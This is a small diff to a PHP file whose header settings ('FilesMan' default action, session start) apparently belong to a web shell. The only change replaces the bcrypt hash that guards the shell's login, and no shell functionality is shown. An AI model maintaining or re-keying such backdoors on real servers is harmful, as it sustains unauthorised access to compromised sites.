@@ -1,6 +1,6 @@
 <?php
 session_start();
-$password = '$2a$14$b0qBYZZRqbhWlMZP9Qy3r.zWsinVXL2Ml8NXGzf348DgM7pytAe.G';
+$password = '$2a$12$9VNlkGNH.BbJ6FLbhjALU.REzk6c.F5FDcFbNJklBCyxiJf6Oq6xO';
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
